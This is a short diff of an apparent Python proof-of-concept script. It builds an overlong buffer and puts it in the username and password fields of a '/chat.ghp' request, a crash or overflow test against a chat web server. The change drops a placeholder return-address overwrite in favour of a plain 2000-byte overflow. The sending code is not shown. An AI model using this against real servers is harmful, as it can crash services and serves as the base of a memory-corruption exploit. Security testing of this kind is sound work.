@@ -1,9 +1,9 @@
+#!/usr/bin/python
+
 import string, sys
 import socket, httplib
 
-buffer = "A"*200
-buffer += "\xEF\xBE\xAD\xDE"
-buffer += "B"*500
+buffer = "A"*2000
 
 url = "/chat.ghp?username=" + buffer + "&password=" + buffer + "&room=1&sex=2"
 
